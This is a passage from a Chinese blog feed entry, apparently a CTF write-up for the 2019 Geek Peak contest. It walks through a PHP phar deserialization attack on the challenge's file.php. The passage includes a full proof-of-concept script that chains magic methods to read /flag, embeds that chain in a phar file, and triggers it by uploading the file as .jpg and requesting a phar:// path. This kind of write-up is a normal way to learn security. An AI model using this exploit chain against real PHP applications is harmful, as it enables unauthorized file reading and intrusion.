</span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;file;</div><div class="line">    &#125;</div><div class="line">&#125;    </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sh0w</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $test;</div><div class="line">    <span class="keyword">public</span> $str;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;str = <span class="keyword">new</span> Show(<span class="string">'index.php'</span>);</div><div class="line">        <span class="keyword">$this</span>-&gt;str-&gt;source = <span class="keyword">$this</span>-&gt;test;    </div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;str-&gt;_show();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>代码审计后发现不能通过文件读取和文件下载直接获取flag，因为这里的过滤无法绕过</strong></p><p><strong>通过class.php代码猜测题目应该是考察的应该是php反序列化漏洞,但是并没有找到unserialize函数,不过发现file.php当中以下的代码可能存在phar反序列化漏洞的问题，php一些函数在使用phar伪协议解析phar文件时，会对phar文件当中的meta-data部分进行反序列化，其中<code>file_exists</code>函数就是其中之一</strong><br><img src="http://pic.c1imber.top/blog/20191019/Tbaro30aL4gW.png?imageslim" alt="mark"></p><p><strong>所以这道题的正确思路是应该是通过phar反序列化获取flag,思路如下：</strong></p><p><strong>构造pop链，生成phar文件，上传-&gt;通过文件读取，使用phar伪协议解析上传的phar文件-&gt;触发file_exists函数，产生php反序列化漏洞-&gt;通过php反序列化获取flag</strong></p><p><strong>构造pop链，生成phar文件：poc如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span>    </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $source;</div><div class="line">    <span class="keyword">public</span> $str;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;source=<span class="string">'/flag'</span>;</div><div class="line">        $text= <span class="keyword">$this</span>-&gt;source;</div><div class="line">        $text = base64_encode(file_get_contents($text));</div><div class="line">        <span class="keyword">return</span> $text;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        $text= <span class="keyword">$this</span>-&gt;source;</div><div class="line">        $text = base64_encode(file_get_contents($text));</div><div class="line">        <span class="keyword">return</span> $text;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key,$value)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|flag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</div><div class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">S6ow</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $file;</div><div class="line">    <span class="keyword">public</span> $params;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>(<span class="string">"_show"</span>=&gt;<span class="string">"file_get"</span>);</div><div class="line">        <span class="keyword">$this</span>-&gt;file=<span class="keyword">new</span> Show();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;params[$key];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)</div><div class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;file;</div><div class="line">    &#125;</div><div class="line">&#125;    </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sh0w</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $test;</div><div class="line">    <span class="keyword">public</span> $str;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;str = <span class="keyword">new</span> S6ow();    </div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;str-&gt;_show();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"poc.phar"</span>); <span class="comment">//后缀名必须为phar</span></div><div class="line">$phar-&gt;startBuffering();</div><div class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></div><div class="line">$o = <span class="keyword">new</span> sh0w();</div><div class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></div><div class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></div><div class="line"><span class="comment">//签名自动计算</span></div><div class="line">$phar-&gt;stopBuffering();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>触发过程：</strong></p><p><strong>sh0w对象反序列化时调用<code>__destruct</code>，调用了S6ow对象的<code>_show</code>方法，由于_show方法不存在，从而调用了<code>__call</code>，此时<code>$this-&gt;{$name}</code>的值变为了<code>_show</code>，在进行<code>$this-&gt;{$name}</code>判断时，由于<code>_show</code>属性也不存在，从而触发了<code>__get</code>方法，<code>$this-&gt;{$name}</code>的值被赋为<code>file_get</code>，从而调用了<code>file_get</code>函数，由于一开始<code>$this-&gt;file</code>的值被设为了Show对象，所以这里将Show对象输出，触发了Show对象的<code>__ToString</code>方法，成功绕过了过滤读取flag</strong></p><p><strong>生成phar文件，将后缀重名名为.jpg上传至服务器,通过phar伪协议读取上传后的文件：<code>/file.php?file=phar:///var/www/html/upload/4935ad2c4be6114f4bf09d55ed82a60b.jpg</code></strong></p><p><img src="http://pic.c1imber.top/blog/20191020/X1VVOQSvHbD7.png?imageslim" alt="mark"><br><strong>base64解码后获取到flag</strong><br><img src="http://pic.c1imber.top/blog/20191020/BO15lt513Lca.png?imageslim" alt="mark"></p><p><strong>剩下的题目，等待writeup出来后学习</strong></p><p><img src="http://pic.c1imber.top/blog/20191020/29mUSro8ePHA.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2019极客巅峰ctf记录&quot;&gt;&lt;a href=&quot;#2019极客巅峰ctf记录&quot; class=&quot;headerlink&quot; title=&quot;2019极客巅峰ctf记录&quot;&gt;&lt;/a&gt;2019极客巅峰ctf记录&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;周六抽时间做了2019极客巅峰的ct
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
</feed>
